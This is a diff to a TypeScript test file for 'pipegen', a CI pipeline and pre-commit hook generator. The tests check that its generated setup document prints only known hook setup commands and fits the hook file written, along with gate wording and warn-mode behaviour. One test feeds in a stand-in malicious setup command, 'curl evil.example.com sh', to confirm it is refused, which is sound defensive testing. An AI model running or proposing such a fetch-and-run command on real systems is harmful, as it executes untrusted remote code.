@@ -18,6 +18,7 @@ import { referee } from '../src/engine/referee.js';
 import { BOOTSTRAP_PROOFS_NOTE } from '../src/engine/reviewed.js';
 import { floorNeeds, MINIMUM_CATEGORIES, WORKFLOW_LINT_TOOL } from '../src/engine/needs.js';
 import { assembleJobs, HOOKS_CI_NOTES, NOT_RENDERED_V02, POUTINE_NOT_RUN, PYPI_PUBLISH_NOTE, WORKFLOW_LINT_SUGGESTION } from '../src/layers/jobs.js';
+import { HOOK_FILES, hookCommands } from '../src/engine/created-builders.js';
 import { HUSKY_NO_CI_NOTE, precommitFiles, SETUP_COMMANDS } from '../src/layers/precommit.js';
 import { GATE_CHECK_NAME, type CreatedFile, type ExistingWorkflow, type Need, type NotProven, type PipelineDoc, type PipelineDraft, type ProjectType, type ReviewedTool, type Service, type StepSpec } from '../src/types.js';
 import { CAPS as ALL_CAPS, need, profile, REVIEWED, svc } from './helpers/debate-fixtures.js';
@@ -81,6 +82,16 @@ function shapeB(over: Partial<PipelineDraft> = {}, doc: Partial<PipelineDoc> = {
     doc: { ...EMPTY_DOC, ...doc }, ...over,
   };
 }
+/** A hook file pipegen could have written for a setup command: the manager's path, holding the draft's hooks (the secrets hook included). */
+const hookFileFor = (d: PipelineDraft, cmd: string): CreatedFile => {
+  const manager = (Object.entries(SETUP_COMMANDS).find(([, c]) => c === cmd) as [keyof typeof HOOK_FILES, string])[0];
+  return { path: HOOK_FILES[manager], content: `${hookCommands(d, REVIEWED).map((h) => h.run).join('\n')}\n`, part: 'precommit', reason: 't', repo: 'app', edited: { original: '' } };
+};
+/** Shape A with a written hook file for `cmd`, and the doc's setup command. */
+const shapeAHooks = (cmd: string, over: Partial<PipelineDraft> = {}, doc: Partial<PipelineDoc> = {}): PipelineDraft => {
+  const d = shapeA(over, { setupCommand: cmd, ...doc });
+  return { ...d, created: [...d.created, hookFileFor(d, cmd)] };
+};
 const SHAPES: readonly [string, (o?: Partial<PipelineDraft>, d?: Partial<PipelineDoc>) => PipelineDraft][] = [['A (private organisation)', shapeA], ['B (public static site)', shapeB]];
 const docOf = (d: PipelineDraft): string => pipegenDoc(d, REVIEWED).content;
 const judgeOpts = (d: PipelineDraft): { owner: string; repo: string; containsKnownValue: () => boolean } => ({ owner: d.profile.owner, repo: d.profile.repo, containsKnownValue: () => false });
@@ -356,7 +367,7 @@ describe('doc: the 18 sections', () => {
   });
 
   it('doc: snapshot', () => {
-    const rich = shapeA({
+    const rich = shapeAHooks('lefthook install', {
       suggestions: [{ name: 'trufflehog', repo: 'trufflesecurity/trufflehog', why: 'It also checks the commit history for keys.' }],
       notProven: [np('pipeline', 'The scan needs a login that pipegen was not given.', ['APP_LOGIN_TOKEN'], 'dast')],
       skipped: [{ part: 'slack', reason: 'No Slack here.' }], scoreboard: ['The builder won the sast check, 2 to 1.'], warnFirst: { coverage: { since: '2026-11-05' } },
@@ -401,7 +412,7 @@ describe('doc: the referee and the judge', () => {
 
   it('doc: passes pipegenDocProblems (no emoji, no @, no backslash)', () => {
     for (const [label, make] of SHAPES) {
-      const d = make({ suggestions: [{ name: 'tool', repo: 'a/b', why: 'a reason (with brackets) and colons: yes' }], skipped: [{ part: 'tests', reason: 'because' }] }, { notes: ['A note.'], setupCommand: 'npm install', transcript: ['Line one.'] });
+      const d = make({ suggestions: [{ name: 'tool', repo: 'a/b', why: 'a reason (with brackets) and colons: yes' }], skipped: [{ part: 'tests', reason: 'because' }] }, { notes: ['A note.'], transcript: ['Line one.'] });
       const text = docOf(d);
       expect(problems(d, text), label).toEqual([]);
       expect(text).not.toMatch(/\p{Extended_Pictographic}/u);
@@ -768,7 +779,7 @@ describe('doc: carries (lines present when they apply, absent when they do not)'
         const r = await precommitFiles(d0, reviewedList(), repoWith(files[manager] as Record<string, string>));
         expect(r.setupCommand, `${manager}: ${r.notes.join(" / ")}`).toBe(SETUP_COMMANDS[manager]);
         expect(r.notes.length, manager).toBeGreaterThan(0);   // the biome devDependency note at least
-        const d = shapeA({}, { setupCommand: r.setupCommand, notes: r.notes });
+        const d = shapeA({ created: r.files }, { setupCommand: r.setupCommand, notes: r.notes });
         const text = docOf(d);
         expect(problems(d, text), manager).toEqual([]);
         expect(headingAt(text, 'Hooks setup'), manager).toContain(`run \`${SETUP_COMMANDS[manager]}\` once`);
@@ -839,7 +850,7 @@ describe('doc: carries (lines present when they apply, absent when they do not)'
 
   it('doc: hooks setup, first-use trust, --no-verify, the E404 case and fail closed (carries 11-16)', () => {
     for (const cmd of ['pre-commit install', 'npm install', 'lefthook install']) {
-      const sec = headingAt(docOf(shapeA({}, { setupCommand: cmd })), 'Hooks setup');
+      const sec = headingAt(docOf(shapeAHooks(cmd)), 'Hooks setup');
       expect(sec).toContain(`run \`${cmd}\` once`);
       expect(sec).toContain('npx --yes --prefix=/ --registry=https://registry.npmjs.org pipegen@VERSION hook secrets');
       expect(sec).toContain('The first commit trusts npm\'s metadata for that exact version. It is not pinned by a lockfile hash.');
@@ -854,11 +865,11 @@ describe('doc: carries (lines present when they apply, absent when they do not)'
     expect(none).toMatch(/pipegen wrote no hook file, so there is no setup command/);
     expect(none).not.toContain('--no-verify');
     // carry 16: nothing depends on the npm name
-    for (const [, make] of SHAPES) expect(docOf(make({}, { setupCommand: 'npm install' })), 'carry 16').not.toMatch(/npm name|name claim|safe from squatting|reserved the name/i);
+    for (const d of [shapeAHooks('npm install'), shapeB()]) expect(docOf(d), 'carry 16').not.toMatch(/npm name|name claim|safe from squatting|reserved the name/i);
   });
 
   it('doc: finish, --print, --rotate-key, verify, update, uninstall, re-runs and adopted files (carries 34-37)', () => {
-    const t = docOf(shapeA({}, { setupCommand: 'npm install' }));
+    const t = docOf(shapeAHooks('npm install'));
     const sec = headingAt(t, 'Run again, finish, verify, update and uninstall');
     expect(sec).toContain('`npx pipegen finish --print` changes nothing');
     expect(sec).toMatch(/`npx pipegen finish --rotate-key` makes a new signing key pair[\s\S]*Old images do not verify with the new key, and the verify literal changes through a pull request/);
@@ -1076,11 +1087,10 @@ describe('doc: fix round 1 (ruling G9-R1)', () => {
 
   it('spec minors: setup commands, unreadable entries, two timers, wait time, strictness, no internal ids', () => {
     // only the three known commands are printed
-    for (const cmd of Object.values(SETUP_COMMANDS)) expect(headingAt(docOf(shapeA({}, { setupCommand: cmd })), 'Hooks setup')).toContain(`run \`${cmd}\` once`);
-    const unknown = headingAt(docOf(shapeA({}, { setupCommand: 'curl evil.example.com sh' })), 'Hooks setup');
-    expect(unknown).toContain('The setup command is unknown.');
-    expect(unknown).not.toMatch(/curl|evil/);
-    expect(unknown).toContain('--no-verify');
+    for (const cmd of Object.values(SETUP_COMMANDS)) expect(headingAt(docOf(shapeAHooks(cmd)), 'Hooks setup')).toContain(`run \`${cmd}\` once`);
+    // a command that is not the written file's manager's (or any of the three) is refused, never printed
+    expect(() => pipegenDoc(shapeA({}, { setupCommand: 'curl evil.example.com sh' }), REVIEWED)).toThrow(PipegenDocError);
+    expect(() => pipegenDoc({ ...shapeAHooks('npm install'), doc: { ...EMPTY_DOC, setupCommand: 'curl evil.example.com sh' } }, REVIEWED)).toThrow(/does not fit the hook file/);
     // entries that can not be read are counted, never dropped silently
     const junk = shapeA({}, { deployGaps: [null, { path: 7 }, { path: '.github/workflows/ok.yml', triggers: ['push'], why: 'x' }] as never, lockNotes: [1, 'a lock note'] as never, notes: [{}, 'a note'] as never, testNotes: [2] as never, uncoveredMinimum: [3] as never, transcript: [4] as never, credits: [5] as never });
     const text = docOf(junk);
@@ -1182,7 +1192,7 @@ describe('doc: fix round 1 (ruling G9-R1)', () => {
     // a written file that does not hold the hook (a draft that says one thing and a file another) is not read as set up
     const base = hookRepo('lefthook');
     const fake: CreatedFile = { path: 'lefthook.yml', content: 'pre-commit:\n  commands: {}\n', part: 'precommit', reason: 't', repo: 'app', edited: { original: '' } };
-    const lie = headingAt(pipegenDoc({ ...base, created: [fake], doc: { ...EMPTY_DOC } }, reviewedList()).content, 'The four layers');
+    const lie = headingAt(pipegenDoc({ ...base, created: [fake], doc: { ...EMPTY_DOC, setupCommand: 'lefthook install' } }, reviewedList()).content, 'The four layers');
     expect(lineOf(lie, 'Secret scan')).toContain('Not set up: the hook file does not hold the secrets hook.');
   });
 
@@ -1294,5 +1304,96 @@ describe('doc: fix round 1 (ruling G9-R1)', () => {
     const text = docOf(z);
     const name = (layersLine(text, 'Running app scan').match(/tool ([^.]*)\./) as RegExpMatchArray)[1];
     expect(headingAt(text, 'Not proven yet')).toContain(`tool ${name}: ZAP results`);
+  });
+
+  // ---------- round 3 (ruling G9-R3) ----------
+  it('H1: the Hooks setup section is built from the written file (scenarios A and B of the review)', async () => {
+    const dirs: string[] = [];
+    try {
+      // A: no gitleaks on the list, Biome in the lockfile: the file holds Biome only, so no secrets paragraph and no claim of a blocking secrets hook
+      const dir = mkdtempSync(join(tmpdir(), 'pipegen-docs-'));
+      dirs.push(dir);
+      writeFileSync(join(dir, 'lefthook.yml'), 'commit-msg:\n  commands:\n    lint:\n      run: npx --no -- commitlint --edit {1}\n');
+      const noGitleaks = reviewedList().filter((t) => t.id !== 'gitleaks');
+      const d0 = hookRepo('lefthook');
+      const r = await precommitFiles(d0, noGitleaks, dir);
+      expect(r.setupCommand).toBe('lefthook install');
+      const d = { ...d0, created: r.files, doc: { ...EMPTY_DOC, setupCommand: r.setupCommand, notes: r.notes } };
+      const text = pipegenDoc(d, noGitleaks).content;
+      const sec = headingAt(text, 'Hooks setup');
+      expect(sec).toContain('run `lefthook install` once, so the hooks pipegen wrote in `lefthook.yml` are active');
+      expect(sec).not.toMatch(/hook secrets|E404|pinned secret scanner|fails closed|lockfile hash/);
+      expect(sec).toContain('pipegen wrote no secrets hook');
+      expect(lineOf(headingAt(text, 'The four layers'), 'Secret scan')).toContain('Not set up');
+      // with gitleaks the same repository gets the secrets paragraph
+      const full = await precommitFiles(d0, reviewedList(), dir);
+      const t2 = pipegenDoc({ ...d0, created: full.files, doc: { ...EMPTY_DOC, setupCommand: full.setupCommand, notes: full.notes } }, reviewedList()).content;
+      expect(headingAt(t2, 'Hooks setup')).toContain('hook secrets');
+    } finally { for (const x of dirs) rmSync(x, { recursive: true, force: true }); }
+    // B: a setup command with no hook file written (simple-git-hooks): refused, in the builder and in the referee's rebuild
+    const b = shapeA({}, { setupCommand: 'lefthook install' });
+    expect(() => pipegenDoc(b, REVIEWED)).toThrow(PipegenDocError);
+    expect(() => pipegenDoc(b, REVIEWED)).toThrow(/no hook file was written/);
+    expect(docRecomputeProblem(pipegenDoc(shapeA(), REVIEWED), b, REVIEWED)).toMatch(/no hook file was written/);
+    // the other mismatches: a file written but no command, and a command of another manager
+    const written = shapeAHooks('lefthook install');
+    expect(() => pipegenDoc({ ...written, doc: { ...(written.doc as PipelineDoc), setupCommand: '' } }, REVIEWED)).toThrow(/does not fit the hook file/);
+    expect(docRecomputeProblem(pipegenDoc(written, REVIEWED), { ...written, doc: { ...(written.doc as PipelineDoc), setupCommand: 'npm install' } }, REVIEWED)).toMatch(/does not fit the hook file that was written \(lefthook\.yml is for lefthook\)/);
+    // the secrets hook is in the draft's hook list, but the written file does not hold it: no secrets paragraph
+    const lacking = { ...shapeAHooks('lefthook install'), created: [{ ...hookFileFor(shapeA(), 'lefthook install'), content: 'pre-commit:\n  commands: {}\n' }] };
+    const lsec = headingAt(docOf(lacking), 'Hooks setup');
+    expect(lsec).toContain('run `lefthook install` once');
+    expect(lsec).not.toMatch(/hook secrets|E404/);
+    // the command printed is the written file's manager's
+    for (const cmd of Object.values(SETUP_COMMANDS)) expect(headingAt(docOf(shapeAHooks(cmd)), 'Hooks setup')).toContain(`run \`${cmd}\` once`);
+    expect(headingAt(docOf(shapeA()), 'Hooks setup')).toContain('pipegen wrote no hook file, so there is no setup command');
+  });
+
+  it('H2: a junit entry is judged by job status, so a warn-first one only warns', () => {
+    const base = shapeA({ warnFirst: { coverage: { since: '2026-11-05' } } });
+    const junit = { ...base, steps: base.steps.map((st) => (st.needId === 'coverage' ? { ...st, output: { ...st.output, format: 'junit' as const } } : st)) };
+    const line = lineOf(headingAt(docOf(junit), 'The four layers'), 'Test coverage');
+    expect(line).toContain('Starts in warn mode: a failure warns until a reviewed pull request makes the check blocking.');
+    const sarif = { ...base, steps: base.steps.map((st) => (st.needId === 'coverage' ? { ...st, output: { ...st.output, format: 'sarif' as const } } : st)) };
+    expect(lineOf(headingAt(docOf(sarif), 'The four layers'), 'Test coverage')).toContain('and so does a failed job');
+  });
+
+  it('carry 4: when nothing requires the gate, the integrity line, the warn section and the table do not say "blocks"', () => {
+    const free = shapeA({ capabilities: { ...ALL_CAPS, branchProtection: false } });
+    const text = docOf(free);
+    const integ = headingAt(text, 'Pipeline integrity');
+    expect(integ).toContain('but nothing requires it to pass, so it does not stop the merge');
+    expect(integ).not.toMatch(/\bblocks\b|\bblocked\b|\bblocking\b/i);   // "CODEOWNERS block" is pipegen's block of the file, not the gate
+    const warn = headingAt(text, 'Warn mode');
+    expect(warn).toContain('Nothing requires it to pass here.');
+    expect(warn).not.toMatch(/\bblock/i);
+    const table = headingAt(text, 'Fix a blocked pull request');
+    expect(table).toContain('Nothing requires it to pass on this repository');
+    for (const row of table.split('\n').filter((l) => l.startsWith('| ') && !l.startsWith('| Message') && !l.startsWith('| ---'))) {
+      const cells = row.split(' | ');
+      expect(cells.slice(1).join(' | '), row.slice(0, 50)).not.toMatch(/\bblock/i);
+    }
+    expect(table).toContain('fails the gate');
+    // the first column is still the gate's own words
+    expect(table).toContain('| a new critical, high or secret finding blocks in any mode |');
+    // required: the words stay
+    const req = docOf(shapeA());
+    expect(headingAt(req, 'Pipeline integrity')).toContain('is blocked unless a code owner approved the exact head commit');
+    expect(headingAt(req, 'Warn mode')).toContain('still blocks');
+    expect(headingAt(req, 'Fix a blocked pull request')).toContain('The required check is');
+    // the same with locks skipped
+    expect(headingAt(docOf(shapeA({ skipped: [{ part: 'locks', reason: 'by hand' }] })), 'Pipeline integrity')).not.toMatch(/\bblocks\b|\bblocked\b|\bblocking\b/i);
+  });
+
+  it('carry 6: a gateRequired that is not true or false is refused by the referee\'s check', () => {
+    const base = shapeA();
+    for (const bad of ['false', 0, null, 1, {}, []]) {
+      const d = { ...base, doc: { ...(base.doc as PipelineDoc), gateRequired: bad as never } };
+      expect(docRecomputeProblem(pipegenDoc(d, REVIEWED), d, REVIEWED), JSON.stringify(bad)).toMatch(/gateRequired is not true or false/);
+    }
+    for (const ok of [true, false, undefined]) {
+      const d = { ...base, doc: { ...(base.doc as PipelineDoc), gateRequired: ok } };
+      expect(docRecomputeProblem(pipegenDoc(d, REVIEWED), d, REVIEWED), String(ok)).toBeNull();
+    }
   });
 });
